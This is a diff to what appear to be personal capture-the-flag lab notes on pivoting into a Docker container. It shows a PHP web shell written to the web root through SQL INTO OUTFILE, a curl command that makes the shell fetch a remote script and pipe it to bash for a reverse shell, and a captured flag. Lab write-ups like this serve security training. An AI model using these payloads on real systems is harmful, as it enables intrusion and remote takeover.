@@ -62,8 +62,18 @@ select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/she
 
 
 We will try to get the shell from the Docker now
-Attacker -> Linux Server 
-Linux -> Docker ()
+Attacker -> Linux Server  (RCE PHP injection)
+Linux -> Docker (PHP injection via SQL) 
+Docker -> Attacker (reverse shell)
 ```
 curl 192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.51.9.13%3A80%2Fphp_rev.sh%7Cbash%20%26
 ```
+
+![[Pasted image 20240818004729.png]]
+
+```
+www-data@ip-10-201-11-33:/var/www$ cat user.txt
+cat user.txt
+HOLO{3792d7d80c4dcabb8a533afddf06f666}
+```
+
